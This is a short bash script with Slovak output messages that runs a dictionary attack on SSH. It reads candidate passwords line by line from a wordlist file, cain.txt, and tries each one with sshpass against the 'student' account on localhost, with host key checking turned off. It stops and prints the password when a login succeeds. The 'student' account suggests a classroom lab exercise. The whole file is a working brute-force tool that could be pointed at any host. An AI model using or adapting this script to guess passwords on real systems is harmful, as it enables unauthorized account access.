#!/bin/bash


#HESLO=$(cat cain.txt) 

while read -r HESLO; do
    echo "Skusam $HESLO"

    sshpass -p$HESLO ssh -o StrictHostKeyChecking=no student@localhost exit

    if [[ $? -eq 0 ]]; then
         echo "Trafil som: $HESLO"
         exit

    fi




done < cain.txt

echo "nenajdene"
